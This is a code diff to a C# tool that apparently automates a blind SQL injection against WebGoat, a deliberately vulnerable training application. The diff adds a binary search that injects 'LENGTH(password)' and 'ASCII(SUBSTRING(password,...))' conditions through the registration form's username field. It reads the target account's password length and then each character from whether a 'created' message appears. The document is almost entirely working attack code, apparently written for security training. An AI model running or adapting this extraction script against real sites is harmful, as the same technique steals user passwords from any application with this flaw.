@@ -46,8 +46,50 @@ namespace WebGoatFuzzer
 
             int curPosition = 1;
             string password = "";
+            string username = txtUsername.Text;
+            int passwordLength = 25;
 
-            while (password.Length < 23)
+            int pwMin = 0;
+            int pwMax = 50;
+
+            while (pwMax - pwMin != 1)
+            {
+                string query = $"{username}' AND LENGTH(password) > {passwordLength} --";
+
+                wbWebGoat.Document.GetElementById("username").SetAttribute("value", query);
+                wbWebGoat.Document.GetElementById("email").SetAttribute("value", "abc@abc.com");
+                wbWebGoat.Document.GetElementById("password").SetAttribute("value", "123");
+                wbWebGoat.Document.GetElementById("confirm-password").SetAttribute("value", "123");
+
+                wbWebGoat.Document.GetElementById("register-submit").InvokeMember("click");
+
+                await Task.Delay(500);
+
+                bool created = false;
+                foreach (HtmlElement element in wbWebGoat.Document.All)
+                {
+                    if (element.InnerText != null && element.InnerText.Contains("created"))
+                    {
+                        created = true;
+                        break;
+                    }
+                }
+                if (created)
+                {
+                    pwMax = passwordLength;
+                    passwordLength = pwMin + ((pwMax - pwMin) / 2);
+                }
+                else
+                {
+                    pwMin = passwordLength;
+                    passwordLength = pwMin + ((pwMax - pwMin) / 2);
+                }
+                txtPwLen.Text = passwordLength.ToString();
+            }
+            passwordLength += 1;
+            txtPwLen.Text = passwordLength.ToString();
+
+            while (password.Length < passwordLength)
             {
                 int min = 0;
                 int max = 127;
@@ -55,7 +97,7 @@ namespace WebGoatFuzzer
 
                 while (max - min != 1)
                 {
-                    string query = $"tom' AND ASCII(SUBSTRING(password,{curPosition},1)) > {curChar} --";
+                    string query = $"{username}' AND ASCII(SUBSTRING(password,{curPosition},1)) > {curChar} --";
 
                     wbWebGoat.Document.GetElementById("username").SetAttribute("value", query);
                     wbWebGoat.Document.GetElementById("email").SetAttribute("value", "abc@abc.com");
